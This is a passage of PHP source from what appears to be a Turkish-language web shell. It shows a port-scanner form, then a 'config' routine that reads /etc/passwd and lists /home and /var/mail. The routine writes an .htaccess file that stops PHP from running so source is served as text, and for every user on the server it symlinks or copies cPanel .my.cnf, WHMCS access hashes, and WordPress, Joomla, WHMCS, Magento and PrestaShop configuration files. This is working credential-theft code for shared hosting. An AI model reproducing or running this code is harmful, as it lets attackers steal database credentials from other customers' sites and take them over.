            $i++;
        }
        foreach ($portlar as $port) {
            $connection = @fsockopen($host, $port, $errno, $errstr, 2);
            if (is_resource($connection)) {
                echo "<center><h2>(" .
                    getservbyport($port, "tcp") .
                    ")" .
                    $port .
                    " " .
                    " Portu açık.</h2>" .
                    "<br></center>";
                fclose($connection);
            }
        }
    }
    if (isset($_GET["porta"])) {
        echo '<center><div class="btnnnnnn" style="width:20%;"><form  action="' .
            $self .
            '?port" method="GET">
			<p><font color="#fff">Host</font></p>
            <input type="text" name="host" placeholder="google.com"/> 
            <p><font color="#fff">Port Başlangıç</font></p>
            <input type="text" name="portb" /><br /> 
            <p><font color="#fff">Port Bitiş</font></p>
            <input type="text" name="portbt" /> 
            <p><input type="submit" name="port" value="Baslat" /></p>
         </form></div></center><br><br>';
    }
    if (isset($_GET["config"])) {
        echo '<div style=margin:0px;padding:4px;text-align:center;color:silver;></div><br> <form method="post"> <center> <center><textarea cols="60" name="passwd" rows="20">';
        $uSr = file("/etc/passwd");
        foreach ($uSr as $usrr) {
            $str = explode(":", $usrr);
            echo $str[0] . "\n";
        }
        echo system("ls /var/mail");
        echo system("ls /home");
        echo '</textarea><center><br> <h2 style="color:#fff;">Home : </h2></center> <select name="home"> <option title="home" value="home">Home</option> 
<option title="home1" value="home1">Home1</option> <option title="home2" value="home2">Home2</option> <option title="home3" 
value="home3">Home3</option> <option title="home4" value="home4">Home4</option> <option title="home5" value="home5">Home5</option> 
<option title="home6" value="home6">Home6</option> <option title="home7" value="home7">Home7</option> <option title="home8" 
value="home8">Home8</option> <option title="home9" value="home9">Home9</option> <option title="home10" value="home10">Home10</option> </select>
<br> <h2 style="color:#fff;">.htaccess : </h2><center> <select name="xenziaworm"> 
<option title="biasa" value="Txt .php Captainkanka"></br><center>Apache 1</center>
</option> <option title="Apache" value="Options all Options +Indexes Options +FollowSymLinks DirectoryIndex xenziaworm.ghost 
AddType text/plain .php AddHandler server-parsed .php AddType text/plain .html AddHandler txt .html Require None Satisfy Any">Apache 2</option> 
<option title="Litespeed" value=" Options +FollowSymLinks DirectoryIndex xenziaworm.ghost RemoveHandler .php AddType application/octet-stream .php ">Litespeed
</option> </select></div><center> </br><input style="color:#3498DB;background-color:#000000" name="conf" size="10" value="Başla" type="submit"> 
</center><br/><br/></form>';
    }
    if ($_POST["conf"]) {
        $home = $_POST["home"];
        $folfig = $home;
        @mkdir($folfig, 0755);
        @chdir($folfig);
        $htaccess = $_POST["xenziaworm"];
        file_put_contents(".htaccess", $htaccess, FILE_APPEND);
        $passwd = explode("\n", $_POST["passwd"]);
        foreach ($passwd as $pwd) {
            $user = trim($pwd);
            symlink("/", "000~ROOT~000");
            copy("/" . $home . "/" . $user . "/.my.cnf", $user . " CPANEL");
            symlink("/" . $home . "/" . $user . "/.my.cnf", $user . " CPANEL");
            copy(
                "/" . $home . "/" . $user . "/.accesshash",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/.accesshash",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/suspended.page/index.html",
                $user . " RESELLER.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/suspended.page/index.html",
                $user . " RESELLER.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/.accesshash",
                $user . "WHMCS.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/wp-config.php",
                $user . "-wp13.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/wp/wp-config.php",
                $user . "-wp13-wp.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/WP/wp-config.php",
                $user . "-wp13-WP.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/wp/beta/wp-config.php",
                $user . "-wp13-wp-beta.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/beta/wp-config.php",
                $user . "-wp13-beta.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/press/wp-config.php",
                $user . "-wp13-press.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/wordpress/wp-config.php",
                $user . "-wp13-wordpress.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/Wordpress/wp-config.php",
                $user . "-wp13-Wordpress.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/blog/wp-config.php",
                $user . "-wp13-Wordpress.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/wordpress/beta/wp-config.php",
                $user . "-wp13-wordpress-beta.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/news/wp-config.php",
                $user . "-wp13-news.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/new/wp-config.php",
                $user . "-wp13-new.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/blog/wp-config.php",
                $user . "-wp-blog.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/beta/wp-config.php",
                $user . "-wp-beta.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/blogs/wp-config.php",
                $user . "-wp-blogs.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/home/wp-config.php",
                $user . "-wp-home.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/protal/wp-config.php",
                $user . "-wp-protal.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/site/wp-config.php",
                $user . "-wp-site.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/main/wp-config.php",
                $user . "-wp-main.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/test/wp-config.php",
                $user . "-wp-test.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/joomla/configuration.php",
                $user . "-joomla2.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/protal/configuration.php",
                $user . "-joomla-protal.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/joo/configuration.php",
                $user . "-joo.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/cms/configuration.php",
                $user . "-joomla-cms.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/site/configuration.php",
                $user . "-joomla-site.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/main/configuration.php",
                $user . "-joomla-main.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/news/configuration.php",
                $user . "-joomla-news.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/new/configuration.php",
                $user . "-joomla-new.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/home/configuration.php",
                $user . "-joomla-home.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/vb/includes/config.php",
                $user . "-vb-config.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/whm/configuration.php",
                $user . "-whm15.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/central/configuration.php",
                $user . "-whm-central.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/whm/whmcs/configuration.php",
                $user . "-whm-whmcs.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/whm/WHMCS/configuration.php",
                $user . "-whm-WHMCS.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/whmc/WHM/configuration.php",
                $user . "-whmc-WHM.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/whmcs/configuration.php",
                $user . "-whmcs.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/support/configuration.php",
                $user . "-support.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/configuration.php",
                $user . "-joomla.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/submitticket.php",
                $user . "-whmcs2.txt"
            );
            @symlink(
                "/home/" . $user . "/public_html/whm/configuration.php",
                $user . "-whm.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/configuration.php",
                $user . " WHMCS or JOOMLA.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/account/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/accounts/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/buy/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/checkout/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/central/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/clienti/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/client/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/cliente/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/clientes/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/clients/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/clientarea/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/clientsarea/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/client-area/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/clients-area/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/clientzone/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/client-zone/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/core/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/company/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/customer/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/customers/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/bill/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/billing/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/finance/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/financeiro/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/host/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/hosts/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/hosting/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/hostings/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/klien/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/manage/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/manager/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/member/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/members/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/my/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/myaccount/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/my-account/client/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/myaccounts/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/my-accounts/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/order/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/orders/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/painel/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/panel/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/panels/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/portal/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/portals/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/purchase/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/secure/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/support/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/supporte/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/supports/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/web/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/webhost/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/webhosting/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/whm/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/whmcs/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/whmcs2/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/Whm/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/Whmcs/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/WHM/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/WHMCS/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/configuration.php",
                $user . " WHMCS or JOOMLA.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/account/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/accounts/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/buy/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/checkout/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/central/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/clienti/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/client/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/cliente/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/clientes/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/clients/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/clientarea/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/clientsarea/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/client-area/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/clients-area/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/clientzone/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/client-zone/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/core/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/company/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/customer/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/customers/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/bill/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/billing/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/finance/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/financeiro/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/host/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/hosts/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/hosting/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/hostings/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/klien/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/manage/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/manager/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/member/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/members/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/my/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/myaccount/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/my-account/client/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/myaccounts/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/my-accounts/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/order/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/orders/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/painel/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/panel/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/panels/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/portal/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/portals/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/purchase/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/secure/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/support/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/supporte/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/supports/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/web/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/webhost/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/webhosting/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/whm/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/whmcs/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/whmcs2/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/Whm/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/Whmcs/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/WHM/configuration.php",
                $user . "WHMCS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/WHMCS/configuration.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/wp/test/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/blog/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/beta/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/portal/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/site/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/wp/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/WP/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/news/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/wordpress/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/test/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/demo/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/home/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/v1/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/v2/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/press/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/new/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/blogs/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/blog/configuration.php",
                $user . "JOOMLA.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/submitticket.php",
                $user . "WHMCS.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/cms/configuration.php",
                $user . "JOOMLA.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/beta/configuration.php",
                $user . "JOOMLA.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/portal/configuration.php",
                $user . "JOOMLA.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/site/configuration.php",
                $user . "JOOMLA.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/main/configuration.php",
                $user . "JOOMLA.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/home/configuration.php",
                $user . "JOOMLA.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/demo/configuration.php",
                $user . "JOOMLA.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/test/configuration.php",
                $user . "JOOMLA.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/v1/configuration.php",
                $user . "JOOMLA.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/v2/configuration.php",
                $user . "JOOMLA.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/joomla/configuration.php",
                $user . "JOOMLA.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/new/configuration.php",
                $user . "JOOMLA.txt"
            );
            copy(
                "/" . $home . "/" . $user . "/public_html/app/etc/local.xml",
                $user . " MAGENTO.txt"
            );
            copy(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/config/settings.inc.php",
                $user . " PRESTASHOP.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/wp/test/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/blog/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/beta/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/portal/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/site/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/wp/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/WP/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/news/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            symlink(
                "/" .
                    $home .
                    "/" .
                    $user .
                    "/public_html/wordpress/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/test/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/demo/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/home/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/v1/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/v2/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            symlink(
                "/" . $home . "/" . $user . "/public_html/press/wp-config.php",
                $user . "WORDPRESS.txt"
            );
            symlink(
